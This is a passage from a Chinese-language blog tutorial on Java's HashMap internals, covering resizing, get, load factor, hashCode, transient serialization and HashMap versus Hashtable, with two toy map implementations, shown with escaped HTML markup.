          &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; oldCapacity =&lt;span&gt; oldTable.length;
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldCapacity ==&lt;span&gt; MAXIMUM_CAPACITY) {
              threshold &lt;/span&gt;=&lt;span&gt; Integer.MAX_VALUE;
              &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
         }
  
         Entry[] newTable &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[newCapacity];
         transfer(newTable);&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;用来将原先table的元素全部移到newTable里面&lt;/span&gt;
         table = newTable;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;再将newTable赋值给table&lt;/span&gt;
         threshold = (&lt;span&gt;int&lt;/span&gt;)(newCapacity * loadFactor);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;重新计算临界值&lt;/span&gt;
     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;新建了一个HashMap的底层数组，上面代码中第10行为调用transfer方法，将HashMap的全部元素添加到新的HashMap中,并重新计算元素在新的数组中的索引位置&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;当HashMap中的元素越来越多的时候，hash冲突的几率也就越来越高，因为数组的长度是固定的。所以为了提高查询的效率，就要对HashMap的数组进行扩容，数组扩容这个操作也会出现在ArrayList中，这是一个常用的操作，而在HashMap数组扩容之后，最消耗性能的点就出现了：原数组中的数据必须重新计算其在新数组中的位置，并放进去，这就是resize&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;那么HashMap什么时候进行扩容呢？当HashMap中的元素个数超过数组大小*loadFactor时，就会进行数组扩容，loadFactor的默认值为0.75，这是一个折中的取值。也就是说，默认情况下，数组大小为16，那么当HashMap中元素个数超过16*0.75=12的时候，就把数组的大小扩展为 2*16=32，即扩大一倍，然后重新计算每个元素在数组中的位置，扩容是需要进行数组复制的，复制数组是非常消耗性能的操作，所以如果我们已经预知HashMap中元素的个数，那么预设元素的个数能够有效的提高HashMap的性能。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;&lt;span&gt;上面讲完了put的方法，接下来我们看下get方法：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V get(Object key) {   
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)   
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; getForNullKey();   
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; hash =&lt;span&gt; hash(key.hashCode());   
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e =&lt;span&gt; table[indexFor(hash, table.length)];   
        e &lt;/span&gt;!= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;   
        e &lt;/span&gt;=&lt;span&gt; e.next) {   
        Object k;   
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key ||&lt;span&gt; key.equals(k)))   
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e.value;   
    }   
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;   
} &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;有了上面存储时的hash算法作为基础，理解起来这段代码就很容易了。从上面的源代码中可以看出：从HashMap中get元素时，首先计算key的hashCode，找到数组中对应位置的某一元素，然后通过key的equals方法在对应位置的链表中找到需要的元素。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;归纳起来简单地说，HashMap 在底层将 key-value 当成一个整体进行处理，这个整体就是一个 Entry 对象。HashMap 底层采用一个 Entry[] 数组来保存所有的 key-value 对，当需要存储一个 Entry 对象时，会根据hash算法来决定其在数组中的存储位置，在根据equals方法决定其在该数组位置上的链表中的存储位置；当需要取出一个Entry时，也会根据hash算法找到其在数组中的存储位置，再根据equals方法从该位置上的链表中取出该Entry。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;四、HashMap重要知识点&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;1.性能参数：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap 包含如下几个构造器：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;HashMap()：构建一个初始容量为 16，负载因子为 0.75 的 HashMap。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;HashMap(int initialCapacity)：构建一个初始容量为 initialCapacity，负载因子为 0.75 的 HashMap。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;HashMap(int initialCapacity, float loadFactor)：以指定初始容量、指定的负载因子创建一个 HashMap。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;HashMap的基础构造器HashMap(int initialCapacity, float loadFactor)带有两个参数，它们是初始容量initialCapacity和加载因子loadFactor。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;initialCapacity：HashMap的最大容量，即为底层数组的长度。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;loadFactor：负载因子loadFactor定义为：散列表的实际元素数目(n)/ 散列表的容量(m)。 负载因子衡量的是一个散列表的空间的使用程度，负载因子越大表示散列表的装填程度越高，反之愈小。对于使用链表法的散列表来说，查找一个元素的平均时间是O(1+a)，因此如果负载因子越大，对空间的利用更充分，然而后果是查找效率的降低；如果负载因子太小，那么散列表的数据将过于稀疏，对空间造成严重浪费。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;HashMap的实现中，通过threshold字段来判断HashMap的最大容量：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
threshold = (&lt;span&gt;int&lt;/span&gt;)(capacity * loadFactor);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;结合负载因子的定义公式可知，threshold就是在此loadFactor和capacity对应下允许的最大元素数目，超过这个数目就重新resize，以降低实际的负载因子。默认的的负载因子0.75是对空间和时间效率的一个平衡选择。当容量超出此最大容量时， resize后的HashMap容量是容量的两倍：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt; (size++ &amp;gt;=&lt;span&gt; threshold)      
    resize(&lt;/span&gt;2 * table.length);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2.HashCode的重要性&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap中对Key的HashCode要做一次rehash，防止一些糟糕的Hash算法生成的糟糕的HashCode，那么为什么要防止糟糕的HashCode？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;糟糕的HashCode意味着的是Hash冲突，即多个不同的Key可能得到的是同一个HashCode&lt;/strong&gt;，糟糕的Hash算法意味着的就是Hash冲突的概率增大，这意味着HashMap的性能将下降，表现在两方面：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、有10个Key，可能6个Key的HashCode都相同，另外四个Key所在的Entry均匀分布在table的位置上，而某一个位置上却连接了6个Entry。这就失去了HashMap的意义，HashMap这种数据结构性高性能的前提是，&lt;strong&gt;Entry均匀地分布在table位置上&lt;/strong&gt;，但现在确是1 1 1 1 6的分布。所以，&lt;strong&gt;我们要求HashCode有很强的随机性&lt;/strong&gt;，这样就尽可能地可以保证了Entry分布的随机性，提升了HashMap的效率。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2、HashMap在一个某个table位置上遍历链表的时候的代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k)))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;看到，由于采用了&quot;&amp;amp;&amp;amp;&quot;运算符，因此先比较HashCode，HashCode都不相同就直接pass了，不会再进行equals比较了。HashCode因为是int值，比较速度非常快，而equals方法往往会对比一系列的内容，速度会慢一些。&lt;strong&gt;Hash冲突的概率大，意味着equals比较的次数势必增多&lt;/strong&gt;，必然降低了HashMap的效率了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;3.HashMap的table为什么是transient的&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;一个非常细节的地方：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;transient Entry[] table;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;看到table用了transient修饰，也就是说table里面的内容全都不会被序列化，这么写的原因？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;因为HashMap是基于HashCode的，HashCode作为Object的方法，是native的：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public native int hashCode();&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这意味着的是：&lt;strong&gt;HashCode和底层实现相关，不同的虚拟机可能有不同的HashCode算法&lt;/strong&gt;。再进一步说得明白些就是，可能同一个Key在虚拟机A上的HashCode=1，在虚拟机B上的HashCode=2，在虚拟机C上的HashCode=3。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这就有问题了，Java自诞生以来，就以跨平台性作为最大卖点，好了，如果table不被transient修饰，在虚拟机A上可以用的程序到虚拟机B上可以用的程序就不能用了，失去了跨平台性，因为：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、Key在虚拟机A上的HashCode=100，连在table[4]上&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2、Key在虚拟机B上的HashCode=101，这样，就去table[5]上找Key，明显找不到&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;整个代码就出问题了。因此，为了避免这一点，Java采取了重写自己序列化table的方法，在writeObject选择将key和value追加到序列化的文件最后面：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; writeObject(java.io.ObjectOutputStream s)
        &lt;/span&gt;&lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException
{
Iterator&lt;/span&gt;&amp;lt;Map.Entry&amp;lt;K,V&amp;gt;&amp;gt; i =&lt;span&gt;
    (size &lt;/span&gt;&amp;gt; 0) ? entrySet0().iterator() : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out the threshold, loadfactor, and any hidden stuff&lt;/span&gt;
&lt;span&gt;s.defaultWriteObject();

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out number of buckets&lt;/span&gt;
&lt;span&gt;s.writeInt(table.length);

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out size (number of Mappings)&lt;/span&gt;
&lt;span&gt;s.writeInt(size);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Write out keys and values (alternating)&lt;/span&gt;
&lt;span&gt;if&lt;/span&gt; (i != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
 &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (i.hasNext()) {
    Map.Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e =&lt;span&gt; i.next();
    s.writeObject(e.getKey());
    s.writeObject(e.getValue());
    }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;而在readObject的时候重构HashMap数据结构：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; readObject(java.io.ObjectInputStream s)
         &lt;/span&gt;&lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException, ClassNotFoundException
{
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read in the threshold, loadfactor, and any hidden stuff&lt;/span&gt;
&lt;span&gt;s.defaultReadObject();

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read in number of buckets and allocate the bucket array;&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; numBuckets =&lt;span&gt; s.readInt();
table &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[numBuckets];

    init();  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Give subclass a chance to do its thing.

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read in size (number of Mappings)&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; size =&lt;span&gt; s.readInt();

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Read the keys and values, and put the mappings in the HashMap&lt;/span&gt;
&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i=0; i&amp;lt;size; i++&lt;span&gt;) {
    K key &lt;/span&gt;=&lt;span&gt; (K) s.readObject();
    V value &lt;/span&gt;=&lt;span&gt; (V) s.readObject();
    putForCreate(key, value);
}
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;一种麻烦的方式，但却保证了跨平台性。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这个例子也告诉了我们：尽管使用的虚拟机大多数情况下都是HotSpot，但是也不能对其它虚拟机不管不顾，有跨平台的思想是一件好事。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;4.&lt;/strong&gt;HashMap和Hashtable的区别&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap和Hashtable是一组相似的键值对集合，它们的区别也是面试常被问的问题之一，我这里简单总结一下HashMap和Hashtable的区别：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、Hashtable是线程安全的，Hashtable所有对外提供的方法都使用了synchronized，也就是同步，而HashMap则是线程非安全的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2、Hashtable不允许空的value，空的value将导致空指针异常，而HashMap则无所谓，没有这方面的限制&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3、上面两个缺点是最主要的区别，另外一个区别无关紧要，我只是提一下，就是两个的rehash算法不同，Hashtable的是：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hash(Object k) {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; hashSeed will be zero if alternative hashing is disabled.&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt; hashSeed ^&lt;span&gt; k.hashCode();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这个hashSeed是使用sun.misc.Hashing类的randomHashSeed方法产生的。HashMap的rehash算法上面看过了，也就是：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; hash(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; h) {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This function ensures that hashCodes that differ only by
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; constant multiples at each bit position have a bounded
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; number of collisions (approximately 8 at default load factor).&lt;/span&gt;
    h ^= (h &amp;gt;&amp;gt;&amp;gt; 20) ^ (h &amp;gt;&amp;gt;&amp;gt; 12&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; h ^ (h &amp;gt;&amp;gt;&amp;gt; 7) ^ (h &amp;gt;&amp;gt;&amp;gt; 4&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;五、自己动手写一个简单的HashMap&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 我们来动手实现一个简单的hashmap&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; study.collection;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyMap001 
{
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 定义一个数组来存放所有的key 和 Value 的值,这里先假设数组的大小为很大的一个.实际底层为数组加链表 数组存在扩容的场景
     * 扩容在前面MyArrayList 中讲过了,所以这里就不重复去做了，因此设置为了990大小.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    MyEntry[]  arr  &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; MyEntry[990&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 大小
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size;
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; put(Object key,Object value){
        MyEntry e &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MyEntry(key,value);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;解决键值重复的处理&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=0;i&amp;lt;size;i++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(arr[i].key.equals(key)){
                arr[i].value&lt;/span&gt;=&lt;span&gt;value;
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ;
            }
        }
        arr[size&lt;/span&gt;++] =&lt;span&gt; e;
    }
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object get(Object key){
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 遍历寻找
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=0;i&amp;lt;size;i++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(arr[i].key.equals(key)){
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arr[i].value;
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
    
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 遍历寻找
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsKey(Object key){
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=0;i&amp;lt;size;i++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(arr[i].key.equals(key)){
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsValue(Object value){
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=0;i&amp;lt;size;i++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(arr[i].value.equals(value)){
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }
    
    
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        MyMap001 m &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MyMap001();
        m.put(&lt;/span&gt;&quot;张三&quot;, &lt;span&gt;new&lt;/span&gt; Wife(&quot;杨洋&quot;&lt;span&gt;));
        m.put(&lt;/span&gt;&quot;李四&quot;, &lt;span&gt;new&lt;/span&gt; Wife(&quot;王五&quot;&lt;span&gt;));
        Wife w &lt;/span&gt;= (Wife) m.get(&quot;张三&quot;&lt;span&gt;);
        System.out.println(w); 
    }

}


&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 
 *  Map 中存放的一个key 一个Value
 *
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyEntry {
    Object key;
    Object value;
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; MyEntry(Object key, Object value) {
        &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.key =&lt;span&gt; key;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
    }    
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;上面的缺陷为：查询效率低，遍历元素的过程。因为所有的元素都存在数组中，采用的数组方式，没有结合链表。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;改进；结合链表机制。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; study.collection;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.LinkedList;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyMap002 
{

    LinkedList[]  arr  &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; LinkedList[9]; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;Map的底层结构就是：数组+链表! 暂时不关注扩容&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size;
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; put(Object key,Object value){
        MyEntry  e &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MyEntry(key,value);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算hash值&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; hash =&lt;span&gt; key.hashCode();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;防止存在负数&lt;/span&gt;
        hash = hash&amp;lt;0?-&lt;span&gt;hash:hash;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;取模&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; a = hash%&lt;span&gt;arr.length;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(arr[a]==&lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;此索引处没有元素&lt;/span&gt;
            LinkedList list = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; LinkedList();
            list.add(e);
            arr[a] &lt;/span&gt;=&lt;span&gt; list;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果存在元素，则先取出&lt;/span&gt;
            LinkedList list =&lt;span&gt; arr[a];
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;遍历此节点上面的链表是否重复元素&lt;/span&gt;
            &lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=0;i&amp;lt;list.size();i++&lt;span&gt;)
            {
                MyEntry e2 &lt;/span&gt;=&lt;span&gt; (MyEntry) list.get(i);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;是否重复&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(e2.key.equals(key)){
                    e2.value &lt;/span&gt;= value;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;键值重复直接覆盖！&lt;/span&gt;
                    &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
                }
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;链表节点上面追加元素&lt;/span&gt;
&lt;span&gt;            arr[a].add(e);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;a:1000--&amp;gt;1   b:10000--&amp;gt;13&lt;/span&gt;
&lt;span&gt;    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object get(Object key){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; a = key.hashCode()%&lt;span&gt;arr.length;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(arr[a]!=&lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            LinkedList list &lt;/span&gt;=&lt;span&gt; arr[a];
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=0;i&amp;lt;list.size();i++&lt;span&gt;){
                MyEntry e &lt;/span&gt;=&lt;span&gt; (MyEntry) list.get(i);
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(e.key.equals(key)){
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e.value;
                }
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        MyMap002 m &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MyMap002();
        m.put(&lt;/span&gt;&quot;张三&quot;, &lt;span&gt;new&lt;/span&gt; Wife(&quot;杨洋&quot;&lt;span&gt;));
        m.put(&lt;/span&gt;&quot;李四&quot;, &lt;span&gt;new&lt;/span&gt; Wife(&quot;王五&quot;&lt;span&gt;));
        Wife w &lt;/span&gt;= (Wife) m.get(&quot;张三&quot;&lt;span&gt;);
        System.out.println(w); 
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;上面是一个简单的实现优化，也只是实现了最基本的功能，但重点在于理解原理和hashmap的原理&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;六、HashMap源码注释&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;151&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; java.util;  
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; java.io.*&lt;span&gt;;  
 
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; HashMap&amp;lt;K,V&amp;gt;  
    &lt;span&gt;extends&lt;/span&gt; AbstractMap&amp;lt;K,V&amp;gt;  
    &lt;span&gt;implements&lt;/span&gt; Map&amp;lt;K,V&amp;gt;&lt;span&gt;, Cloneable, Serializable  
{  
 
